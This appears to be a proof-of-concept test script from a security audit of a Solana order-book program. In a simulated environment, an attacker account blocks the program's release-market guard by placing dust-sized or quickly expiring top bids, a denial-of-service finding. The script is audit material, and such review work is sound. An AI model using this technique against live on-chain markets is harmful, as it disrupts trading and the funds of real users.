# M3 + new "dust top-bid" DoS: release.rs top_bid() reads only the single best bid.
import sys,pathlib,struct
S=pathlib.Path(__file__).resolve().parent.parent/'run/heli/solana-v20/scripts'
sys.path.insert(0,str(S))
src=(S/'poc_review.py').read_text().split('# ===== Independent review PoCs')[0]
g={'__name__':'__main__'};exec(compile(src,'poc_head','exec'),g)
t=g['t'];m=g['m'];q=g['q'];qv=g['qv'];bv=g['bv'];seat=g['seat'];deposit=g['deposit']
MANIFEST=g['MANIFEST']
def order(owner,amount_atoms,is_bid,mantissa,exponent,last_valid_slot=0):
 t.send('order',[t.Instruction(MANIFEST,b'\x06\x00'+struct.pack('<II',0,1)+struct.pack('<QIbBIB',amount_atoms,mantissa,exponent,int(is_bid),last_valid_slot,0),[t.meta(owner.pubkey(),True,True),t.meta(m,True),t.meta(t.SYSTEM)])],[owner])
def observe(label,base_time):
 t.clock(base_time)
 logs=None
 try:
  t.call('observe_release_market');return 'OK'
 except AssertionError as e:
  return 'REJECTED: '+('Market guard rejected' if 'Market guard' in str(e) else str(e)[:120])
eve=t.outsider;t.svm.airdrop(eve.pubkey(),10_000_000_000);seat(eve)
eq=t.token_account(q,eve.pubkey())
t.send('eve quote',[t.Instruction(t.TOKEN,b'\x07'+struct.pack('<Q',10*t.U),[t.meta(q,True),t.meta(eq,True),t.meta(t.admin.pubkey(),False,True)])])
deposit(eve,eq,qv,q,2*t.U)
T0=t.boundary(12)+24*3600
print('baseline observe (bob 9995 HELI @1.0 is top):',observe('base',T0))
# Dust bid: 1 HELI at 1.1 quote/HELI (mantissa 11, exp -1) => top bid depth 1.1 quote << 5000
order(eve,10_000,True,11,-1)
print('after 0.01-HELI dust bid above (collateral 0.011 quote):',observe('dust',T0+3600))
# Anyone clears it by selling into it (alice sells 1 HELI at 1.1)
deposit(t.alice,g['f']['wallet'],bv,t.defaults['mint'],t.U);order(t.alice,10_000,False,11,-1)
print('after someone sells 0.01 HELI into the dust bid:',observe('cleared',T0+2*3600))
# M3: short-lived bid that expires while still top of book
c=t.svm.get_clock();slot=c.slot
pass
order(eve,10_000,True,12,-1,last_valid_slot=slot+2)   # 0.01 HELI @1.2, valid 2 slots
c=t.svm.get_clock();c.slot=slot+10;t.svm.set_clock(c)
print('expired top bid still in book, observe:',observe('expired',T0+3*3600))
c=t.svm.get_clock();c.slot=slot+200;t.svm.set_clock(c)
print('still blocked 190 slots later:',observe('expired2',T0+4*3600+10))
deposit(t.alice,g['f']['wallet'],bv,t.defaults['mint'],t.U);order(t.alice,10_000,False,12,-1)
print('after a 0.01 HELI ask at 1.2 (crosses nothing valid at 1.2; expired order should be swept):',observe('swept',T0+5*3600+20))
